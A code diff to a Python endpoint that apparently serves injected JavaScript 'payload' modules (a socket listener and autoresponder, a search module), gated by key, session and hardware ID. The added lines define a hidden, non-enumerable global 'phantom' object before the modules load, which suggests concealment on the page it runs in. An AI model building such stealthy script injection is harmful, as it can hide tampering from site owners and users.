@@ -205,11 +205,17 @@ async def get_payload(key: str = "", session_id: str = "", hwid: str = "", team:
                 "radar.js"  # Слухач: сокети, автовідповідач, VIP-радар
             ]
 
-            # (Опціонально) Якщо команда fs ще не перейшла на модулі, залишаємо їм старий файл
             if team == "fs":
                 modules = ["smart_search.js", "payload-fs.js"]
 
-            raw_js = ""
+                # 🔥 ІНІЦІАЛІЗУЄМО ФАНТОМА ДО ЗАВАНТАЖЕННЯ МОДУЛІВ
+            raw_js = """
+            if (!window._alphaPhantom) {
+                Object.defineProperty(window, '_alphaPhantom', {
+                    value: {}, enumerable: false, writable: true
+                });
+            }
+            """
 
             # 2. По черзі читаємо кожен файл і склеюємо їх
             for module in modules:
